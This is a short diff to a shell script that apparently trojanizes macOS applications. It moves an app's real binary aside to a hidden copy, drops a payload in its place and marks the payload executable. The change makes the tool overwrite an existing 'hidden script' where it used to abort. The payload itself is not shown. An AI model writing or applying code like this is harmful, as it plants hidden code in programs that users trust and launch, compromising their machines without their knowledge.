@@ -31,9 +31,10 @@ logloc "MacOS directory" "$macos"
 logloc "Binary" "$binary"
 
 if [[ -f "${binary}_" ]]; then
-    fail "There is already a hidden script inside this application!"
+    warn "Replacing existing hidden script."
+else
+    mv "$binary" "${binary}_"
 fi
-mv "$binary" "${binary}_"
 cp "$payload" "$binary"
 chmod +x "$binary"
 
